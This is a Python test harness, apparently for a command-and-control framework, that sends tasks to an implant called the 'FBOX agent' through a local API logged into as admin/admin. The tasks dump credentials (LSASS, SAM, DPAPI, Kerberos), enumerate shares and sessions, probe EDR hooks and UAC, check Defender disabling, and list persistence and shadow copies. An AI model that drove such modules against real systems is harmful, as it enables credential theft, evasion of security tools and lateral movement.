"""
Test offensive modules on FBOX agent.
Dispatches each offensive action and checks the result.
"""
import requests
import time
import json
import sys

BASE = "http://localhost:8000/api/v1"
AGENT_ID = "baa3576f-4a28-45db-bc2e-91fceb3466c6"

def login():
    r = requests.post(f"{BASE}/auth/login", json={"username": "admin", "password": "admin"})
    return r.json()["access_token"]

def dispatch(token, module, action, params=None, wait=30):
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"agent_id": AGENT_ID, "module": module, "action": action, "params": params or {}, "priority": "high"}
    r = requests.post(f"{BASE}/tasks", json=payload, headers=headers)
    if r.status_code != 201:
        return {"status": "error", "error": f"HTTP {r.status_code}: {r.text}"}
    task = r.json()
    task_id = task["id"]
    # Poll
    for _ in range(wait * 2):
        time.sleep(0.5)
        t = requests.get(f"{BASE}/tasks/{task_id}", headers=headers)
        if t.status_code != 200:
            continue
        td = t.json()
        if td["status"] in ("completed", "ok", "failed", "error", "cancelled"):
            return td
    return {"status": "timeout", "task_id": task_id}

def run_test(name, module, action, params=None, wait=30):
    print(f"\n{'='*60}")
    print(f"TEST: {name}")
    print(f"  module={module} action={action} params={params}")
    print(f"{'='*60}")
    token = login()
    result = dispatch(token, module, action, params, wait)
    status = result.get("status", "unknown")
    error = result.get("error")
    result_data = result.get("result")

    print(f"  STATUS: {status}")
    if error:
        print(f"  ERROR: {error}")
    if result_data:
        if isinstance(result_data, str):
            try:
                result_data = json.loads(result_data)
            except:
                pass
        if isinstance(result_data, dict):
            # Don't print huge base64 blobs
            for k, v in result_data.items():
                if isinstance(v, str) and len(v) > 200:
                    print(f"  {k}: <{len(v)} chars>")
                elif isinstance(v, list):
                    print(f"  {k}: [{len(v)} items]")
                    for item in v[:3]:
                        if isinstance(item, dict):
                            short = {kk: (vv[:50] + "..." if isinstance(vv, str) and len(vv) > 50 else vv) for kk, vv in item.items()}
                            print(f"    - {short}")
                        else:
                            print(f"    - {item}")
                elif isinstance(v, dict):
                    print(f"  {k}: {json.dumps(v, default=str)[:200]}")
                else:
                    print(f"  {k}: {v}")
        else:
            print(f"  RESULT: {str(result_data)[:300]}")

    return status in ("completed", "ok")

if __name__ == "__main__":
    tests = [
        # Credential dump
        ("LSASS Dump", "credential_dump", "lsass", {}, 45),
        ("Registry Dump (SAM/SYSTEM)", "credential_dump", "registry", {}, 30),
        ("DPAPI Master Keys", "credential_dump", "dpapi", {}, 15),
        ("Kerberos Tickets", "credential_dump", "kerberos", {}, 15),
        # Injection
        ("List Processes (injection)", "injection", "list_processes", {}, 15),
        # Lateral movement
        ("Enumerate Shares", "lateral", "enumerate_shares", {}, 20),
        ("Enumerate Sessions", "lateral", "enumerate_sessions", {}, 15),
        # EDR evasion
        ("EDR Status", "edr_evasion", "status", {}, 15),
        ("Check Hooks", "edr_evasion", "check_hooks", {}, 15),
        # UAC bypass
        ("Check UAC Level", "uac_bypass", "check_uac", {}, 10),
        # Pass the hash / tickets
        ("Dump Tickets (PTH)", "pth", "dump_tickets", {}, 15),
        # Token impersonation
        ("Get UID (Token)", "token", "get_uid", {}, 10),
        ("Get Privileges (Token)", "token", "get_privileges", {}, 10),
        # Anti-analysis
        ("Anti-Analysis Check", "anti_analysis", "check", {"abort_on_detected": False}, 15),
        # Stealth
        ("Stealth Indicators", "stealth", "indicators", {}, 10),
        # Persistence advanced
        ("List Persistence (Adv)", "persistence_adv", "list_persistence", {}, 15),
        # Process
        ("Process List", "process", "list", {}, 10),
        # Builtin offensive
        ("Disable Defender (check only)", "builtin", "disable_defender", {}, 15),
        ("Shadow Copies Enum", "builtin", "shadow_copies", {}, 15),
        ("Backups Enum", "builtin", "backups_enum", {}, 15),
    ]

    passed = 0
    failed = 0
    results = []

    for name, module, action, params, wait in tests:
        try:
            ok = run_test(name, module, action, params, wait)
            results.append((name, "PASS" if ok else "FAIL"))
            if ok:
                passed += 1
            else:
                failed += 1
        except Exception as e:
            print(f"  EXCEPTION: {e}")
            results.append((name, f"ERROR: {e}"))
            failed += 1

    print(f"\n{'='*60}")
    print(f"SUMMARY: {passed} passed, {failed} failed, {len(tests)} total")
    print(f"{'='*60}")
    for name, status in results:
        icon = "✓" if status == "PASS" else "✗"
        print(f"  {icon} {name}: {status}")
